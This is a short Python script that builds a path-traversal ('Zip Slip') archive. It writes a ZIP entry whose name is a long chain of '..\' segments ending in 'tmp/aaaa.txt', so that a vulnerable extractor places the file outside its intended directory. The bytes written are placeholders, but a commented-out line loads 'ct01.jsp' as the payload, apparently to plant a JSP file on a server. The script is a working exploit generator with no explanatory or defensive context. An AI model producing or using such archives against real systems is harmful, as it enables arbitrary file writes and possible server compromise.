import zipfile
 
if __name__ == "__main__":
    try:
        
        binary = b'123'
        binary = b'hello world!!'
        binary = b'sssssssssssssss'
        #binary = open('ct01.jsp','r').read()
        zipFile = zipfile.ZipFile("ok-aaaa.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("ok-aaaa.zip")
        #zipFile.writestr("testaaa.txt", b'%s' % binary)
        zipFile.writestr("..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\..\\\.\\\\tmp/aaaa.txt", b'%s' % binary)
        zipFile.close()
    except IOError as e:
        raise e
